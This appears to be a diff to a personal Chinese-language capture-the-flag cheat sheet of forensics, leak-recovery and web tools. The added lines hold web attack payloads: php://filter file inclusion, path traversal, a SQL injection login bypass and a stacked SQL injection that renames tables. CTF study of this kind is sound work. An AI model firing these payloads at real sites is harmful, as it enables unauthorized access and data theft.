@@ -2,8 +2,8 @@
 1 bless(类似于winhex)把文件按照16进制打开
 2 binwalk 分离文件,也可以使用dd命令或foremost
 3 ssh -p url 使用端口连接ssh
-4 nc url 使用 nc连接远程主机
-5 githack url/.git 扫描泄漏的.git内容
+4 nc url 端口 使用 nc连接远程主机
+5 githacker --url url --folder result
 5 dirsearch 扫描网站后台目录
 6 yijian 强大的工具
 7 zip2john zip压缩包路径 >passwd.txt(获得hash文件);john passwd.txt 最终获得密码
@@ -30,6 +30,34 @@
 28 010editor 类似于winhex bless
 29 post传参 curl -d 'what=flag' url 给url传递"what=flag"
 30 zsteg  检测图片是否行有lsb隐写内容
+31 unar解压文件就不会乱码
+32 本地文件包含 ?file=php://filter/read/convert.base64-encode/resource=flag.php
+33 Secret File 构造pyload ?file=php://filter/convert.base64-encode/resource=flag.php
+34 php代码审计source.php?file=source.php?/../../../../ffffllllaaaagggg 
+35 dbeaver 数据库图形化软件
+36 sql万能登陆 ?username=admin%27or%271%27=%271&password=admin%27or%271%27=%271
+37 修改表名(将表名user改为users)
+   alter table user rename to users;
+   修改列名(将字段名username改为name)
+   alter table users change uesrname name varchar(30);
+    1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#
+
+    拆分开来如下
+    1';
+    alter table words rename to words1;
+    alter table `1919810931114514` rename to words;
+    alter table words change flag id varchar(50);
+38 ./frpc -c ./frpc.ini&&./frps -c ./frps.ini
+39 curl -X url(使用特定方法请求网页文本) -v显示详细信息
+40 302跳转之类的可以使用curl请求
+41 git log显示日志
+42 git diff xxx 对比
+43 git stash pop/list
+44 svn泄漏 dvcs-ripper 工具中的 rip-svn.pl rip-svn -u url  cd .svn;cat wc.db |grep -a flag 然后慢慢找
+45 rip-hg -u url/.hg/ hg status;如果服务端删除了 flag 文件的话，那么可尝试从历史记录里寻找。路径是 .hg/store/data/
+46 
+
+
 _______________文件头______________________________________________
 
 JPEG (jpg)，文件头：FFD8FF
